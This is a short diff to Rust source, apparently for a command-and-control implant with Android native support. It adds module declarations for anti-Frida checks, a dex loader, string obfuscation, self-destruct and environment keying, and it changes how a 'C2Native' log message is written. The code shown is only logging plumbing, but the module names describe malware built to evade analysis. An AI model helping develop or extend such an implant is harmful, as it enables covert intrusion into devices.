@@ -10,6 +10,12 @@ mod crypto;
 mod c2_protocol;
 mod anti_debug;
 mod environment;
+mod env_key;
+mod selfdestruct;
+mod string_obf;
+mod dex_loader;
+mod antifrida;
+mod protocol;
 
 use crypto::{AesCrypto, SessionKey};
 use c2_protocol::C2Message;
@@ -348,14 +354,17 @@ mod android {
             #[cfg(target_os = "android")]
             {
                 use std::ffi::CString;
+                extern "C" {
+                    fn __android_log_write(
+                        prio: libc::c_int,
+                        tag: *const libc::c_char,
+                        text: *const libc::c_char,
+                    ) -> libc::c_int;
+                }
                 let tag = CString::new("C2Native").unwrap();
                 let msg = CString::new(msg).unwrap();
                 unsafe {
-                    libc::__android_log_write(
-                        3, // INFO level
-                        tag.as_ptr(),
-                        msg.as_ptr(),
-                    );
+                    __android_log_write(3, tag.as_ptr(), msg.as_ptr());
                 }
             }
         }
